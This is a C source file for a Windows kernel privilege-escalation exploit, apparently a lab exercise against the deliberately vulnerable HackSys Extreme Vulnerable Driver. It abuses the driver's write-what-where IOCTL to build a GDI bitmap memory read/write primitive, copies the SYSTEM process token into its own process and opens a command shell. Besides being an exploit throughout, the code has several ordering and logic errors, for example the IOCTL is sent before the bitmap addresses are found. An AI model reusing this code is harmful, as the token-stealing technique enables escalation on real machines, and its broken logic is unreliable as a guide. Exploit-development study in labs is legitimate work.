#include <stdio.h>
#include <Windows.h>
#include <winternl.h>
#include <psapi.h>

#define ProcessBasicInformation 0
#define BUFFER_SIZE             (0x64 * 0x64 * 4)
#define MODULE_SIZE             0x1000
#define NT_SUCCESS(status)      (status >= 0)
#define PID_OFFSET              0x2E8
#define TOKEN_OFFSET            0x358
#define FLINK_OFFSET            0x2F0
#define CASE_ID                 0x22200B

typedef struct _WRITE_WHAT_WHERE {
   PULONG_PTR What;
   PULONG_PTR Where;
} WRITE_WHAT_WHERE, * PWRITE_WHAT_WHERE;

typedef struct {
   PVOID64 pKernelAddress; // 0x00
   USHORT wProcessId;      // 0x08
   USHORT wCount;          // 0x0a
   USHORT wUpper;          // 0x0c
   USHORT wType;           // 0x0e
   PVOID64 pUserAddress;   // 0x10
} GDICELL64, *PGDICELL64;   // sizeof = 0x18

typedef NTSTATUS (*pNtQueryInformationProcess)(
   IN HANDLE ProcessHandle,
   IN PROCESSINFOCLASS ProcessInformationClass,
   OUT PVOID ProcessInformation,
   IN ULONG ProcessInformationLength
);

typedef NTSTATUS(*pNtQuerySystemInformation)(
   IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
   OUT PVOID SystemInformation,
   IN ULONG SystemInformationLength,
   OUT PULONG ReturnLength);

pNtQueryInformationProcess selfNtQueryInformationProcess = NULL;
pNtQuerySystemInformation selfNtQuerySystemInformation = NULL;
HMODULE hNtdll = NULL;
HBITMAP hBitmap[2] = { 0 };
GDICELL64 gdicell[2] = { 0 };
PVOID pvScan0[2] = { 0 };
CHAR buffer[BUFFER_SIZE] = { 0 };
ULONG64 moduleBase[MODULE_SIZE] = { 0 };
ULONG64 kernelBase = 0;

void ErrorOutput(const char* msg)
{
   printf(msg);
   printf("[-] Error Code: %d\n", GetLastError());
   exit(1);
}

void GetSurfaceAddr()
{
   for(int i = 0; i < 2; ++i)
   {
       hBitmap[i] = CreateBitmap(0x64, 0x64, 1, 32, &buffer);
       if (!hBitmap[i])
       {
           ErrorOutput("[-] Failed To Create Bitmap Object\n");
       }
   }
   HANDLE currProc = GetCurrentProcess();
   if (!currProc)
   {
       ErrorOutput("[-] Failed To Get Current Process\n");
   }
   hNtdll = LoadLibraryA("ntdll.dll");
   if (!hNtdll)
   {
       ErrorOutput("[-] Failed To Load Ntdll.dll\n");
   }
   selfNtQueryInformationProcess = (pNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
   if (!selfNtQueryInformationProcess)
   {
       ErrorOutput("[-] Failed To Get NtQueryInformationProcess Address\n");
   }
   printf("[+] NtQueryInformationProcess Address: 0x%ullx\n", (ULONG64)selfNtQueryInformationProcess);
   PROCESS_BASIC_INFORMATION procBasicInfo = { 0 };
   if (!NT_SUCCESS(selfNtQueryInformationProcess(currProc, ProcessBasicInformation, (PVOID)&procBasicInfo, sizeof(procBasicInfo))))
   {
       ErrorOutput("[-] Failed To Get Process PEB\n");
   }
   PGDICELL64 GdiSharedHandleTable = (PGDICELL64)(*(PULONG64)((PCHAR)procBasicInfo.PebBaseAddress + 0xF8));
   for (int i = 0; i < 2; ++i)
   {
       gdicell[0] = GdiSharedHandleTable[LOWORD(hBitmap[i])];
       pvScan0[i] = (PVOID)((PCHAR)gdicell[i].pKernelAddress + 0x50);
       printf("[+] pvScan0[%d] Address: 0x%ullx\n", i, (ULONG64)pvScan0[i]);
   }
}

void ReadMemmory(PVOID address, PVOID dest, ULONG64 len)
{
   SetBitmapBits(hBitmap[0], 8, address);
   GetBitmapBits(hBitmap[1], len, dest);
}

void WriteMemmory(PVOID address, PVOID src, ULONG64 len)
{
   SetBitmapBits(hBitmap[0], 8, address);
   SetBitmapBits(hBitmap[1], len, src);
}

void GetKernelBase()
{
   selfNtQuerySystemInformation = GetProcAddress(hNtdll, "NtQuerySystemInformation");
   if (!selfNtQuerySystemInformation)
   {
       ErrorOutput("[-] Failed To Get NtQuerySystemInformation Address\n");
   }
   printf("[+] NtQuerySystemInformation Address: 0x%ullx\n", (ULONG64)selfNtQuerySystemInformation);
   // Get the base_address of ntoskrnl.exe in kernel
   DWORD length = 0;
   if (EnumDeviceDrivers((LPVOID)&moduleBase, sizeof(moduleBase), (LPDWORD)&length))
   {
       kernelBase = moduleBase[0];
       printf("[+] Kernel Base_Address: 0x%ullx\n", kernelBase);
       return;
   }
   ErrorOutput("[-] Failed To Get Kernel Base_Address\n");
}

void StealToken()
{
   // Get the EPROCESS of System process
   HMODULE hKernel = LoadLibraryA("ntoskrnl.exe");
   if (!hKernel)
   {
       ErrorOutput("[-] Failed To Load ntoskrnl.exe\n");
   }
   ULONG64 pEprocess = GetProcAddress(hKernel, "PsInitialSystemProcess");
   if (!pEprocess)
   {
       ErrorOutput("[-] Failed To Get EPROCESS Address\n");
   }
   ReadMemmory(pEprocess - (ULONG64)hKernel + kernelBase, &pEprocess, sizeof(pEprocess));
   FreeLibrary(hKernel);

   // Get the EPROCESS of current process
   DWORD currProcPid = GetCurrentProcessId();
   LIST_ENTRY processLink = { 0 };
   WriteMemmory(pEprocess + FLINK_OFFSET, &processLink, 0x10);
   // Loop the double linklist to find the current process
   while (1)
   {
       ULONG64 pTempEprocess = processLink.Flink - FLINK_OFFSET;
       ULONG64 tempPid = 0;
       ReadMemmory(pTempEprocess + PID_OFFSET, &tempPid, sizeof(tempPid));
       if (tempPid == currProcPid)
       {
           printf("[+] Success To Get The Current Process's EPROCESS\n");
           WriteMemmory(pTempEprocess + TOKEN_OFFSET, pEprocess + TOKEN_OFFSET, 0x8);
           break;
       }
       WriteMemmory(pTempEprocess + FLINK_OFFSET, &processLink, 0x10);
       if (pEprocess == processLink.Flink)
       {
           break;
       }
   }
}

void CreateCmd()
{
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi = { 0 };
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_SHOW;
	WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
	BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&si, &pi);
	if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);
}

int main()
{
   HANDLE hDevice = CreateFile(L"\\\\.\\HackSysExtremeVulnerableDriver",
               GENERIC_WRITE | GENERIC_READ,
               FILE_SHARE_READ | FILE_SHARE_WRITE,
               0,
               OPEN_EXISTING,
               FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
               0);
   if (hDevice == INVALID_HANDLE_VALUE)
   {
       ErrorOutput("[-] Failed To Open The file\n");
   }
   else
   {
       printf("[+] Driver Handle: %d\n", (ULONG)hDevice);
   }
   WRITE_WHAT_WHERE www = { 0 };
   ULONG64 savepvScan0 = pvScan0[0];
   www.What = pvScan0[1];
   www.Where = &savepvScan0;
   ULONG retLength = 0;
   BOOL ret = DeviceIoControl(hDevice,
       CASE_ID,
       &www,
       sizeof(WRITE_WHAT_WHERE),
       NULL,
       0,
       &retLength,
       NULL);
   if (!ret)
   {
       ErrorOutput("[-] Failed To Send Message\n");
   }
   GetSurfaceAddr();
   GetKernelBase();
   StealToken();
   printf("[+] Time To Get Shell\n");
   CreateCmd();
   CloseHandle(hDevice);
   system("pause");
   return 0;
}